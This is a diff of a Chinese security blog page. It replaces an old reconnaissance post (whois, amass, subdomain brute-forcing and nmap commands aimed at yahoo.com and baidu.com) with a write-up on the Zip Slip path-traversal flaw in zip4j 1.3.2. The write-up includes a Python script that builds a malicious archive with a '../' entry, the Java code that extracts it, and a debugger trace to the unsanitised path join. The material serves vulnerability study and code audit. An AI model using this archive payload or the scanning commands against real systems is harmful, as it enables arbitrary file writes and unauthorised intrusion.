@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="我的信息收集论, 渗透测试,漏洞挖掘,攻防对抗">
+    <meta name="keywords" content="java审计之Zip Slip, 渗透测试,漏洞挖掘,攻防对抗">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>我的信息收集论 | m1k0er&#39;Blogs</title>
+    <title>java审计之Zip Slip | m1k0er&#39;Blogs</title>
     <link rel="icon" type="image/jpeg" href="/medias/2.jpeg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -290,12 +290,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">我的信息收集论</h1>
+                    <h1 class="description center-align post-title">java审计之Zip Slip</h1>
                 </div>
             </div>
         </div>
@@ -411,8 +411,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                <span class="chip bg-color">渗透测试</span>
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">代码审计</span>
                             </a>
                         
                     </div>
@@ -423,8 +423,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                渗透测试
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
                             </a>
                         
                     </div>
@@ -436,7 +436,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-22
+                    2022-10-29
                 </div>
                 
 
@@ -457,46 +457,111 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>众所周知，做漏洞挖掘前期的信息收集工作起着非常大的作用，可以说信息收集的工作决定了你在做漏洞挖掘时的效率，本篇文章旨在记录下我的信息收集准备工作。</p>
-<a id="more"></a>
+                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>自由，在这个从头烂到根的地方早已不存在了。</p>
+<h2 id="0x01-Zip-Slip？"><a href="#0x01-Zip-Slip？" class="headerlink" title="0x01 Zip Slip？"></a>0x01 Zip Slip？</h2><p>Zip Slip这个漏洞是在18年由国外安全团队snyk提出的，这个漏洞允许攻击者在系统中任意写入一个文件来达到RCE的目的，简单来说，Zip Slip其实算是目录遍历的一种漏洞，攻击者可以构造一个压缩文件名为”../../test”的压缩包，在解压时，程序没有对文件名进行合法的校验，而是直接拼接到解压目录后面，导致可以将文件解压到正常解压目录之外。</p>
+<p>目前很多开发语言，比如Python、javascript等都相应考虑到并修复了该漏洞，但是由于java没有对存档文件进行处理的高级API，所以这个漏洞在java环境最为常见。</p>
+<p>snyk建立了一个项目，我们可以对应自己的项目看看是否存在版本漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p>
+<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>这里以zip4j1.3.2为例子</p>
+<p>由于在windows中不允许文件名有”../“这种字符，所以我们使用脚本构造一个恶意的poc.zip</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> zipfile
+<span class="token keyword">import</span> os
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        zipFile <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"poc.zip"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>
+        info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"poc.zip"</span><span class="token punctuation">)</span>
+        zipFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"E:/vul.txt"</span><span class="token punctuation">,</span><span class="token string">"../ceshi/vul.txt"</span><span class="token punctuation">,</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>
+        zipFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>导入依赖：</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>net.lingala.zip4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>zip4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>解压poc.zip</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span>
 
-<h1 id="二、水平域的收集"><a href="#二、水平域的收集" class="headerlink" title="二、水平域的收集"></a>二、水平域的收集</h1><p>当你挖一家厂商时，可以先看看厂商在hackerone是否有项目，有的话可以去里面收集范围：<br><img src="https://img-blog.csdnimg.cn/20210122173407447.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>如果希望在hackerone给的赏金范围上继续进行资产的收集，我们可以将目光转到 <a target="_blank" rel="noopener" href="https://crunchbase.com/">https://crunchbase.com</a> 的网站，进一步扩大我们的业务范围。</p>
-<p>从这里我们可以看到很多收购行为，我们需要对这些收购行为进行谷歌搜索并分析，以确定这个行为是否仍属于母公司，而并没有拆分和出售给其他公司:<br><img src="https://img-blog.csdnimg.cn/20210122174255277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当然我们也可以通过反whois查询来查询注册邮箱或者联系人下的资产信息，如下图，我们首先来看看yahoo的whois：</p>
-<pre><code>whois yahoo.com</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210122174512416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>通过whois查看到注册人邮箱为<a href="mailto:&#100;&#111;&#109;&#97;&#x69;&#110;&#x2d;&#97;&#x64;&#109;&#105;&#x6e;&#x40;&#x6f;&#x61;&#x74;&#x68;&#x2e;&#x63;&#111;&#x6d;">&#100;&#111;&#109;&#97;&#x69;&#110;&#x2d;&#97;&#x64;&#109;&#105;&#x6e;&#x40;&#x6f;&#x61;&#x74;&#x68;&#x2e;&#x63;&#111;&#x6d;</a>，我们就可以通过此电子邮箱来查找与yahoo.com 具有相同注册人电子邮件的所有其他站点，你可以通过 <a target="_blank" rel="noopener" href="https://tools.whoisxmlapi.com/reverse-whois-search">https://tools.whoisxmlapi.com/reverse-whois-search</a> 来进行查询，也可以通过 <a target="_blank" rel="noopener" href="https://viewdns.info/">https://viewdns.info</a> 来进行反whois查询，渗透测试神器amass也提供了相应的查询功能，查询的命令为：</p>
-<pre><code>amass intel -whois -d yahoo-inc.com</code></pre>
-<p>有时候我们会遇到域名有屏蔽关键信息的现象，导致我们没办法看到真正的注册邮箱，这个时候我们可以通过查询域名的历史whois来得到关键信息，这时我们可以使用 <a target="_blank" rel="noopener" href="https://www.whoxy.com/">https://www.whoxy.com/</a> 来查询历史whois。</p>
-<h1 id="三、ASN枚举"><a href="#三、ASN枚举" class="headerlink" title="三、ASN枚举"></a>三、ASN枚举</h1><p>通过(bgp.he.net)来查询as号：</p>
-<p>我们可以利用amass来查询组织名称中带有sony的asn号，使用的命令是：</p>
-<pre><code>amass intel -org sony</code></pre>
-<p>通过<a target="_blank" rel="noopener" href="https://github.com/yassineaboukir/Asnlookup">Asnlookup</a>来获取特定组织的资产ip段。</p>
-<h1 id="四、垂直域的收集"><a href="#四、垂直域的收集" class="headerlink" title="四、垂直域的收集"></a>四、垂直域的收集</h1><p>子域名枚举是信息收集工作中最为重要的一环，子域名收集得越全，你挖到漏洞的概率也会相应地增加，这里就简单讲下我平时收集子域名的主要几种方式吧。<br>1、通过burpsuite收集子域名</p>
-<p>第一步，确定收集的范围；<br>第二步，对所有的链接进行爬行，爬虫的工具很多，这里不多加述说，这里我使用的是burpsuite：<br><img src="https://img-blog.csdnimg.cn/20210122181243476.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>从以上两步操作后，我们可以对获取的子域名进行第二次爬虫，当然，逆向结果尽可能多点，可以多爬几次。<br>第三步，导出子域名<br>“Engagement Tools” -&gt; “Analyze target” -&gt; 保存为html文件 -&gt; 从html文件中复制出我们的host。<br>我们还可以从爬行的js文件中获取子域名，具体操作步骤如下：</p>
-<p>将所有的链接复制到js.txt中，筛选处js文件：</p>
-<pre><code>cat js.txt | grep ‘\.js’</code></pre>
-<p>利用<a target="_blank" rel="noopener" href="https://github.com/nsonaniya2010/SubDomainizer">SubDomainizer</a>来获取js文件中的子域名。</p>
-<p>2、从api接口获取子域名</p>
-<p>互联网上有很多能够查询域信息的网站，如crt.sh，DNSDB，virustotal，sslmate等网站，我们可以利用这些网站来收集更多的子域名，我经常使用的是以下两款个人感觉好用的工具：</p>
-<ul>
-<li>利用amass查找子域名：</li>
-</ul>
-<pre><code>amass enum --passive -d baidu.com</code></pre>
-<ul>
-<li>利用subfinder来查询子域名：<pre><code>echo baidu.com | subfinder</code></pre>
-</li>
-</ul>
-<p>3、基于字典的子域名枚举</p>
-<p>基于字典的子域名枚举的工具有很多，以下是我经常使用的工具:</p>
-<ul>
-<li>使用amass爆破子域名：<pre><code>amass enum -brute -d baidu.com -w ~/Desktop/tool/fuzz/dns/sub_small.txt</code></pre>
-</li>
-<li>使用shuffledns爆破子域名：<pre><code>shuffledns -d baidu.com -r ~/tools/massdns/lists/resolvers.txt -w ~/Desktop/tool/fuzz/dns/sub_small.txt</code></pre>
-<h1 id="五、端口扫描"><a href="#五、端口扫描" class="headerlink" title="五、端口扫描"></a>五、端口扫描</h1>1、利用nmap对前面收集的子域名进行全端口的扫描：</li>
-</ul>
-<pre><code>nmap -sV -sS -iL sub.txt --open -p- -T4 -oX result.xml</code></pre>
-<p>2、解析nmap扫描结果，对于最终的扫描结果，我们需要解析获取相应的数据。</p>
-<p>3、对于开启web端口的我们需要获取标题，状态码等信息，我们可以使用<a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/httpx">httpx</a>来达到这个目的。</p>
-<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>以上便是我对企业资产进行收集的全过程，有不足的部分还要请各位师傅请教。</p>
+<span class="token keyword">import</span> net<span class="token punctuation">.</span>lingala<span class="token punctuation">.</span>zip4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>ZipFile<span class="token punctuation">;</span>
+<span class="token keyword">import</span> net<span class="token punctuation">.</span>lingala<span class="token punctuation">.</span>zip4j<span class="token punctuation">.</span>exception<span class="token punctuation">.</span>ZipException<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            ZipFile zipFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipFile</span><span class="token punctuation">(</span><span class="token string">"E:\\tool\\demo\\poc.zip"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            zipFile<span class="token punctuation">.</span><span class="token function">extractAll</span><span class="token punctuation">(</span><span class="token string">"E:\\tool\\"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ZipException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们生成一个恶意的压缩包为poc.zip，里面的压缩条目名为”../ceshi/vul.txt”，我们的解压目录为<code>E:\\tool\\</code>，正常来说，我们的压缩包解压后会解压在<code>E:\\tool\\</code>下，但是由于程序没有对文件名做好校验，导致我们最终解压的文件会在<code>E:\ceshi</code>下，复现结果也是成功跳出了正常的解压目录达到任意写文件的目的。</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029232425544.png"></p>
+<h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>我们先在第12行下个断点，看看zip4j是怎么处理解压的。</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029232634259.png"></p>
+<p>调试步入extractAll方法</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029232916616.png"></p>
+<p>跟进到extractAll重载方法</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029232950233.png"></p>
+<p>这里重点关注第241行，跟进去看看</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029233404916.png"></p>
+<p>这里的runThread为false，所以我们继续跟进到51行的this.initExtractAll</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029233550516.png"></p>
+<p>继续跟进到62行的重载</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">initExtractFile</span><span class="token punctuation">(</span>FileHeader fileHeader<span class="token punctuation">,</span> String outPath<span class="token punctuation">,</span> UnzipParameters unzipParameters<span class="token punctuation">,</span> String newFileName<span class="token punctuation">,</span> ProgressMonitor progressMonitor<span class="token punctuation">)</span> <span class="token keyword">throws</span> ZipException <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>fileHeader <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ZipException</span><span class="token punctuation">(</span><span class="token string">"fileHeader is null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            progressMonitor<span class="token punctuation">.</span><span class="token function">setFileName</span><span class="token punctuation">(</span>fileHeader<span class="token punctuation">.</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>outPath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>InternalZipConstants<span class="token punctuation">.</span>FILE_SEPARATOR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                outPath <span class="token operator">=</span> outPath <span class="token operator">+</span> InternalZipConstants<span class="token punctuation">.</span>FILE_SEPARATOR<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>fileHeader<span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    String fileName <span class="token operator">=</span> fileHeader<span class="token punctuation">.</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Zip4jUtil<span class="token punctuation">.</span><span class="token function">isStringNotNullAndNotEmpty</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">return</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                    String completePath <span class="token operator">=</span> outPath <span class="token operator">+</span> fileName<span class="token punctuation">;</span>
+                    File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>completePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        file<span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    progressMonitor<span class="token punctuation">.</span><span class="token function">endProgressMonitorError</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ZipException</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkOutputDirectoryStructure</span><span class="token punctuation">(</span>fileHeader<span class="token punctuation">,</span> outPath<span class="token punctuation">,</span> newFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                UnzipEngine unzipEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnzipEngine</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>zipModel<span class="token punctuation">,</span> fileHeader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    unzipEngine<span class="token punctuation">.</span><span class="token function">unzipFile</span><span class="token punctuation">(</span>progressMonitor<span class="token punctuation">,</span> outPath<span class="token punctuation">,</span> newFileName<span class="token punctuation">,</span> unzipParameters<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    progressMonitor<span class="token punctuation">.</span><span class="token function">endProgressMonitorError</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ZipException</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ZipException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            progressMonitor<span class="token punctuation">.</span><span class="token function">endProgressMonitorError</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> var11<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var12<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            progressMonitor<span class="token punctuation">.</span><span class="token function">endProgressMonitorError</span><span class="token punctuation">(</span>var12<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ZipException</span><span class="token punctuation">(</span>var12<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>当文件不是目录时，则进入checkOutputDirectoryStructure方法来处理文件，跟进到checkOutputDirectoryStructure</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029235402198.png"></p>
+<p>漏洞点存在于第162到165行，在第165行没有经过任何过滤直接将解压目录和文件进行拼接，导致我们可以构造一个<code>../test</code>的文件名压缩后，再解压就能达到任意写入恶意文件的目的。</p>
+<p>0x04 参考资料</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2382">Zip Slip漏洞综述</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.ryotak.me/post/homebrew-security-incident-en/">Remote code execution in Homebrew by compromising the official Cask repository</a></p>
 
                 
             </div>
@@ -523,7 +588,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/01/22/wo-de-xin-xi-shou-ji-lun/">http://example.com/2021/01/22/wo-de-xin-xi-shou-ji-lun/</a>
+                    <a href="http://example.com/2022/10/29/java-shen-ji-zhi-zip-slip/">http://example.com/2022/10/29/java-shen-ji-zhi-zip-slip/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -561,8 +626,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                    <span class="chip bg-color">渗透测试</span>
+                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">代码审计</span>
                                 </a>
                             
                         </div>
@@ -732,84 +797,36 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/10/10/rao-guo-403-zong-jie/">
+                <a href="/2022/10/29/java-shen-ji-zhi-zip-slip/">
                     <div class="card-image">
                         
                         
-                        <img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/09.jpg" class="responsive-img" alt="绕过403总结">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="java审计之Zip Slip">
                         
-                        <span class="card-title">绕过403总结</span>
+                        <span class="card-title">java审计之Zip Slip</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-10
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                    渗透测试
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                        <span class="chip bg-color">渗透测试</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/01/22/wo-de-xin-xi-shou-ji-lun/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/12.jpg" class="responsive-img" alt="我的信息收集论">
-                        
-                        <span class="card-title">我的信息收集论</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            一、前言众所周知，做漏洞挖掘前期的信息收集工作起着非常大的作用，可以说信息收集的工作决定了你在做漏洞挖掘时的效率，本篇文章旨在记录下我的信息收集准备工作。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-29
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                    渗透测试
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
@@ -820,8 +837,57 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                        <span class="chip bg-color">渗透测试</span>
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/10/25/java-fan-xu-lie-hua-zhi-ji-chu-pian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="java反序列化之基础篇">
+                        
+                        <span class="card-title">java反序列化之基础篇</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
